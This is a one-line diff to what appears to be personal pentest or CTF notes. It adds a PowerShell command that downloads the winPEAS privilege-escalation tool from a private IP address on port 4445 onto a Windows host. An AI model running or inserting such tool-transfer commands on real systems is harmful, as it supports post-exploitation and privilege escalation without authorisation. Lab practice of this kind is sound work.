@@ -1,7 +1,7 @@
 [[Editing Copy Page]]
 
 ```
-
+powershell wget http://10.10.245.141:4445/winPEASx64.exe -OutFile winPEASx64.exe
 ```
 
 ```
